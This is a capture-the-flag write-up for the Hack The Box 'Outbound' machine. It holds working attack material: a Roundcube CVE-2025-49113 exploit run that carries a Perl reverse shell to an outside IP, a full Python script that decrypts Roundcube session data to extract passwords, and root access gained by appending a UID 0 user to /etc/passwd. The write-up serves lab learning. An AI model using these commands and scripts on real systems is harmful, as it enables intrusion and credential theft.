https://app.hackthebox.com/machines/Outbound

## INFO

* **Target User Credentials:** `tyler / LhKL1o9Nm3X2`

## Enumeration

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)

```

### Mail Service Version Information

The target is running **Roundcube Webmail 1.6.10**, which is vulnerable to **CVE-2025-49113**.

## INITIAL ACCESS

A post-authentication Remote Code Execution (RCE) via PHP Object Deserialization was leveraged using the following exploit script and payload:

https://github.com/hakaioffsec/CVE-2025-49113-exploit

```bash
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "perl -e 'use Socket;\$i=\"10.10.14.67\";\$p=4848;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"bash -i\");};'"
```

**Exploit Execution Output:**

```
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
### Retrieving CSRF token and session cookie...
### Authenticating user: tyler
### Authentication successful
### Command to be executed: 
perl -e 'use Socket;$i="10.10.14.67";$p=4848;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">\&S");open(STDOUT,">\&S");open(STDERR,">\&S");exec("bash -i");};'
### Injecting payload...
### End payload: http://mail.outbound.htb/?_from=edit-[...REDACTED URL...]
### Payload injected successfully
### Executing payload...

```

and I'm in !

## OWN USER

### Database Information Gathering

After gaining foot-hold I quickly find that I will need to hack the user Jacob so I'm going to explore a little bit.

I take a look at the roundcube configuration files

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

```

This is interresting ! Let's check the DB :

```bash
mysql -u roundcube -pRCDBPass2025 -h 127.0.0.1 roundcube

```

```
MariaDB [roundcube]> SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| users               |
| session             |
| identities          |
[...]

```

Checking the `users` table:

```text
MariaDB [roundcube]> SELECT * from users;
+---------+----------+-----------+---------------------+
| user_id | username | mail_host | created             |
+---------+----------+-----------+---------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 |
|       2 | mel      | localhost | 2025-06-08 12:04:51 |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 |
+---------+----------+-----------+---------------------+

```

In order to compromise the user **jacob**, the `session` table was dumped to extract potentially active or encrypted session tokens:

```bash
mysql -u roundcube -pRCDBPass2025 -h127.0.0.1 -B -N -e "SELECT sess_id, vars FROM session" roundcube > sessions.tsv

```

I use a custom decryption script against the session data using the `rcmail-!24ByteDESkey*Str`` key:

```python
import sys, re, base64, pathlib, hashlib
from typing import Dict, Optional
from Crypto.Cipher import AES, DES3

DES_KEY = b'rcmail-!24ByteDESkey*Str'
AES_KEY = hashlib.sha256(DES_KEY).digest()


def b64fix(s: str) -> str:
    return s + "=" * (-len(s) % 4)


def pkcs7_unpad(buf: bytes) -> bytes:
    pad = buf[-1]
    if pad < 1 or pad > 16 or buf[-pad:] != bytes([pad]) * pad:
        raise ValueError("padding invalide")
    return buf[:-pad]

def decrypt_blob(b64_blob: str) -> bytes:
    try:
        blob = base64.b64decode(b64fix(b64_blob))
    except Exception:
        return b64_blob.encode()
    if len(blob) >= 32:
        iv, ct = blob[:16], blob[16:]
        if len(ct) % 16 == 0:
            try:
                pt = AES.new(AES_KEY, AES.MODE_CBC, iv).decrypt(ct)
                return pkcs7_unpad(pt)
            except Exception:
                pass 
    if len(blob) >= 16 and len(blob) % 8 == 0:
        iv, ct = blob[:8], blob[8:]
        pt = DES3.new(DES_KEY, DES3.MODE_CBC, iv).decrypt(ct)
        return pt.rstrip(b"\0")[:-1]

    return blob

def decrypt_value(enc: str) -> str:
    try:
        blob = base64.b64decode(b64fix(enc))
    except Exception:
        return enc

    if len(blob) >= 32:
        iv, ct = blob[:16], blob[16:]
        if len(ct) % 16 == 0:
            try:
                pt = AES.new(AES_KEY, AES.MODE_CBC, iv).decrypt(ct)
                return pkcs7_unpad(pt).decode(errors="replace")
            except Exception:
                pass
    if len(blob) >= 16 and len(blob) % 8 == 0:
        iv, ct = blob[:8], blob[8:]
        try:
            pt = DES3.new(DES_KEY, DES3.MODE_CBC, iv).decrypt(ct)
            return pt.rstrip(b"\0")[:-1].decode(errors="replace")
        except Exception:
            pass

    return enc

PHP_KV_RE = re.compile(rb'([a-z_]+)\|s:\d+:"([^"]+)"', re.I)


def parse_php_vars(blob: bytes) -> Dict[str, str]:
    return {m[0].decode(): m[1].decode() for m in PHP_KV_RE.findall(blob)}

def process_tsv(lines):
    for line in lines:
        if not line.strip():
            continue
        sid, b64_vars = line.rstrip("\n").split("\t", 1)

        try:
            clear = decrypt_blob(b64_vars)
        except Exception as e:
            print("[!] Vars illisible %s… : %s" % (sid[:12], e))
            continue

        kv = parse_php_vars(clear)
        user = kv.get("username") or kv.get("user")
        enc_pwd = kv.get("password")
        pwd = decrypt_value(enc_pwd) if enc_pwd else "-"
        auth = kv.get("auth") or kv.get("auth_secret")

        print("%s…  %-30s %s" % (sid[:12], user or '-', pwd))
        if auth:
            print("   cookie ⇒ roundcube_sessid=%s; roundcube_sessauth=%s"
                  % (sid, auth))

if __name__ == "__main__":
    if len(sys.argv) > 1:
        with pathlib.Path(sys.argv[1]).expanduser().open() as f:
            process_tsv(f)
    else:
        process_tsv(sys.stdin)
```

```bash
python3 decypher.py sessions.tsv   

```

**Output:**

```text
6a5ktqih5uca…  jacob                          595mO8DmwGeD
   cookie ⇒ roundcube_sessid=6a5ktqih5uca6lj8vrmgh9v0oh; roundcube_sessauth=DpYqv6maI9HxDL5GhcCd8JaQQW

```

Password for jacob is : `595mO8DmwGeD`


Connecting to the local IMAP service via SSL to read **jacob**'s emails:

```bash
openssl s_client -crlf -connect 127.0.0.1:993

```

```text
a LOGIN jacob 595mO8DmwGeD
a OK Logged in

b LIST "" "*"
c SELECT INBOX
* 2 EXISTS

a FETCH 1:2 (BODY.PEEK[HEADER.FIELDS (From Subject Date)])
* 1 FETCH (BODY[HEADER.FIELDS (FROM SUBJECT DATE)]
Subject: Important Update
From: tyler@outbound.htb

b FETCH 1 BODY[]
[...]
Due to the recent change of policies your password has been changed.
Please use the following credentials to log into your account: gY4Wr3a1evp4
[...]

```

The email revealed a new administrative password: `gY4Wr3a1evp4`. This password was successfully used to establish an **SSH connection** as **jacob**.

## OWN ROOT

I run linpeas and here is the flaw

```text
═╣ Writable passwd file? ................ /etc/passwd is writable

```

Since `/etc/passwd` is globally writable, a new root-level user can be directly appended.

I generate a password :

```bash
openssl passwd Password123

```
I add the user `r00t` to `/etc/passwd` with the password:

```bash
echo "r00t:[HASH_GENERATED]:0:0:root:/root:/bin/bash" >> /etc/passwd

```

And I log into this new account

```bash
su r00t

```

Done !